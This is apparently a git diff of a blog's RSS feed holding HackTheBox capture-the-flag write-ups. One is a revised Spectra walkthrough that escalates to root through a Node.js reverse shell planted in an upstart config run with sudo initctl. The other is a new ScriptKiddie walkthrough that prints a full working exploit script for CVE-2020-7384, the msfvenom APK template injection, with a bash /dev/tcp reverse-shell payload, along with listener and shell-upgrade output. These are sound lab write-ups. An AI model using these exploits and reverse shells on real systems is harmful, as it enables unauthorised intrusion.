@@ -12,8 +12,8 @@
       <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
-      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user.</description>
-      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user. The user has sudo privileges on <code>initctl</code>, and this can be leveraged to get a root shell.</p>
+      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts off by enumerating a misconfigured WordPress website which has a directory listing enabled, exposing the web source. The config file contains a database password and it can be used to access the admin dashboard, allowing me to inject a PHP code in a WordPress theme file and leveraging it to gain a foothold on the system. Internal enumeration finds an auto-login password, which is reused by the user.</description>
+      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts off by enumerating a misconfigured WordPress website which has a directory listing enabled, exposing the web source. The config file contains a database password and it can be used to access the admin dashboard, allowing me to inject a PHP code in a WordPress theme file and leveraging it to gain a foothold on the system. Internal enumeration finds an auto-login password, which is reused by the user. The user has sudo privileges on <code>initctl</code>, and this can be leveraged to get a root shell.</p>
 <h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>Exploiting WordPress</li>
@@ -180,7 +180,7 @@ drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#
 /usr/local/share/nginx/html/testing/wp-config.php
 /mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
 /mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
-</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has credentials with the one on <code>/testing</code>.</p>
+</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
 ...&lt;SNIP&gt;...
 // ** MySQL settings - You can get this info from your web host ** //
@@ -221,7 +221,7 @@ script
 <li><code>/mnt/stateful_partition/etc/autologin</code></li>
 <li><code>/etc/autologin</code></li>
 </ul>
-<p>I found the <code>passwd</code> file which contains a password in the <code>/etc/autologin/</code> directory.</p>
+<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
 total <span style="color:#ae81ff">4</span>
 -rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
@@ -259,12 +259,11 @@ drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#
 -r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
 </code></pre></div><h3 id="shell-as-root">Shell as root</h3>
 <h4 id="internal-enumeration-1">Internal Enumeration</h4>
-<p>The first thing I will check if I have the user&rsquo;s password is the sudo privileges, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>.</p>
+<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
 User katie may run the following commands on spectra:
     <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
-</code></pre></div><p>Unfortunately, <code>initctl</code> is not listed on GTFObins site. I&rsquo;ll have to look around.</p>
-<p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
+</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
     <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
     <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
@@ -278,7 +277,7 @@ User katie may run the following commands on spectra:
     <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
     <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
     <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
-</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.</p>
+</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  This file itself is not that important here.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
 description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
 author      <span style="color:#e6db74">&#34;katie&#34;</span>
@@ -303,8 +302,8 @@ pre-stop script
     echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
 end script
 </code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
-<p>The <code>/srv/nodetest.js</code> file itself is not important because with sudo privileges and write access on those configuration files, I can perform a command injection to send myself a reverse shell by leveraging <a href="https://gtfobins.github.io/gtfobins/node/#sudo">Node</a>.</p>
-<p>I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
+<p>With sudo privileges and write access on those configuration files, I can perform a command injection to send myself a root shell. In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
+<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
 $ cat exploit.conf
 description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
@@ -315,10 +314,10 @@ stop on shutdown
 
 script
 
-    export RHOST<span style="color:#f92672">=</span>10.10.14.21
-    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
     export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
     echo $$ &gt; /var/run/nodetest.pid
+    export RHOST<span style="color:#f92672">=</span>10.10.14.21
+    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
     exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
 </span><span style="color:#e6db74">    this.pipe(sh.stdin);
 </span><span style="color:#e6db74">    sh.stdout.pipe(this);
@@ -333,20 +332,34 @@ $ scp exploit.conf katie@10.10.10.229:/dev/shm
 Password:
 bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
 exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
-</code></pre></div><p>I&rsquo;ll use the following command and setup a <code>nc</code> listener on my Kali.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 <span style="color:#f92672">&amp;&amp;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
-</code></pre></div><p>If I check on my listener, I have a root shell now.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null; cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
+test5 start/running, process <span style="color:#ae81ff">33889</span>
+</code></pre></div><p>If I check my listener, I have a root shell now.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
 $ nc -nvlp <span style="color:#ae81ff">9001</span>
 listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35486</span>
-whoami
-root
-id
+connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">37220</span>
+id <span style="color:#f92672">&amp;&amp;</span> hostname <span style="color:#f92672">&amp;&amp;</span> ip a
 uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-</code></pre></div><p><img class="img-container" src="imgs/image-20210627002203606.png" alt="image-20210627002203606"  />
-</p>
-<hr>
+spectra
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc pfifo_fast state UP group default qlen <span style="color:#ae81ff">1000</span>
+    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
+       valid_lft 86303sec preferred_lft 14303sec
+    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
+       valid_lft 86303sec preferred_lft 14303sec
+    inet6 fe80::250:56ff:feb9:b2c/64 scope link
+       valid_lft forever preferred_lft forever
+</code></pre></div><hr>
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
@@ -1061,6 +1074,314 @@ $ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">
     </item>
     
     <item>
+      <title>HackTheBox - ScriptKiddie</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</link>
+      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</guid>
+      <description>Exploiting exploitation tools</description>
+      <content:encoded><![CDATA[<p>ScriptKiddie consists of two exploitations on Metasploit framework. The first one is exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. The second is exploiting sudo privileges on <code>msfconsole</code>  to gain a root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploiting Metasploit CVE-2020-7384</li>
+<li>Exploiting custom script</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>CVE-2020-7384 <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">PoC</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
+$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:42 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
+Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+Reason: <span style="color:#ae81ff">65533</span> resets
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+5000/tcp open  upnp    syn-ack ttl <span style="color:#ae81ff">63</span>
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 45.79 seconds
+</code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
+$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:44 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
+Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+5000/tcp open  http    Werkzeug httpd 0.16.1 <span style="color:#f92672">(</span>Python 3.8.5<span style="color:#f92672">)</span>
+|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
+|_http-title: k1d<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">5</span> h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.66 second
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
+<p>The site provides several online hacking tools.</p>
+<p><img class="img-container" src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  />
+</p>
+<p>The <code>nmap</code> tool can be used to scan against itself.</p>
+<p><img class="img-container" src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  />
+</p>
+<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused. But I&rsquo;ll note the <code>nmap</code> version.</p>
+<p>The next tool is <code>msfvenom</code>, it can be used to generate a binary for sending a reverse shell.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
+<p><img class="img-container" src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  />
+</p>
+<p>Somehow, it can only generates payload for Windows and Android.</p>
+<p><img class="img-container" src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  />
+</p>
+<p>The payload is available at <code>http://10.10.10.226:5000/static/payloads/[here]</code> for 5 mins.</p>
+<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returns this message</p>
+<p><img class="img-container" src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  />
+</p>
+<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
+<p>I can&rsquo;t get the tools version except for <code>nmap</code>.  So, I searched some exploits before the box release (February 2021) on Exploit-DB  and here is what I found.</p>
+<p><img class="img-container" src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  />
+</p>
+<p>And that is probably what I need.</p>
+<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
+<p><img class="img-container" src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  />
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-kid">Shell as kid</h3>
+<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
+<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> tempfile
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32encode
+
+<span style="color:#75715e"># Change me</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>
+
+<span style="color:#75715e"># b32encode to avoid badchars (keytool is picky)</span>
+<span style="color:#75715e"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
+<span style="color:#75715e"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
+payload_b32 <span style="color:#f92672">=</span> b32encode(payload<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+dname <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CN=&#39;|echo </span><span style="color:#e6db74">{</span>payload_b32<span style="color:#e6db74">}</span><span style="color:#e6db74"> | base32 -d | sh #&#34;</span>
+
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Manufacturing evil apkfile&#34;</span>)
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-dname: </span><span style="color:#e6db74">{</span>dname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+print()
+
+tmpdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./&#34;</span>
+apk_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;evil.apk&#34;</span>)
+empty_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;empty&#34;</span>)
+keystore_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;signing.keystore&#34;</span>)
+storepass <span style="color:#f92672">=</span> keypass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span>
+key_alias <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;signing.key&#34;</span>
+open(empty_file, <span style="color:#e6db74">&#34;w&#34;</span>)<span style="color:#f92672">.</span>close()
+subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;zip&#34;</span>, <span style="color:#e6db74">&#34;-j&#34;</span>, apk_file, empty_file])
+
+subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;keytool&#34;</span>, <span style="color:#e6db74">&#34;-genkey&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file, <span style="color:#e6db74">&#34;-alias&#34;</span>, key_alias, <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass,
+                       <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, <span style="color:#e6db74">&#34;-keyalg&#34;</span>, <span style="color:#e6db74">&#34;RSA&#34;</span>, <span style="color:#e6db74">&#34;-keysize&#34;</span>, <span style="color:#e6db74">&#34;2048&#34;</span>, <span style="color:#e6db74">&#34;-dname&#34;</span>, dname])
+subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;jarsigner&#34;</span>, <span style="color:#e6db74">&#34;-sigalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1withRSA&#34;</span>, <span style="color:#e6db74">&#34;-digestalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file,
+                       <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass, <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, apk_file, key_alias])
+print()
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Done! apkfile is at </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Do: msfvenom -x </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span>)
+</code></pre></div><p>It produces a file called <code>evil.apk</code> . It also shows the exploit commands.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ python3 exploit_msfvenom.py
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Manufacturing evil apkfile
+Payload: bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
+-dname: CN<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  adding: empty (stored 0%)
+</span><span style="color:#e6db74">jar signed.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Warning:
+</span><span style="color:#e6db74">The signer&#39;</span>s certificate is self-signed.
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Done! apkfile is at ./evil.apk
+Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>127.0.0.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -o /dev/null
+</code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
+<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
+<p><img class="img-container" src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  />
+</p>
+<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> root@kali «exploits» «10.10.14.31» 
+$ nc -nvlp <span style="color:#ae81ff">9000</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+kid@scriptkiddie:~/html$    
+</code></pre></div><p><img class="img-container" src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  />
+</p>
+<h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I&rsquo;ll upgrade my shell first.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31» 
+$ nc -nvlp <span style="color:#ae81ff">9000</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+kid@scriptkiddie:~/html$ id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span>
+kid@scriptkiddie:~/html$ export TERM<span style="color:#f92672">=</span>xterm
+export TERM<span style="color:#f92672">=</span>xterm
+kid@scriptkiddie:~/html$ which python
+which python
+kid@scriptkiddie:~/html$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+kid@scriptkiddie:~/html$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
+→ root@kali «exploits» «10.10.14.31» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>
+
+kid@scriptkiddie:~/html$ 
+</code></pre></div><p>User flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/html$ cd ~
+kid@scriptkiddie:~$ ls -la
+total <span style="color:#ae81ff">60</span>
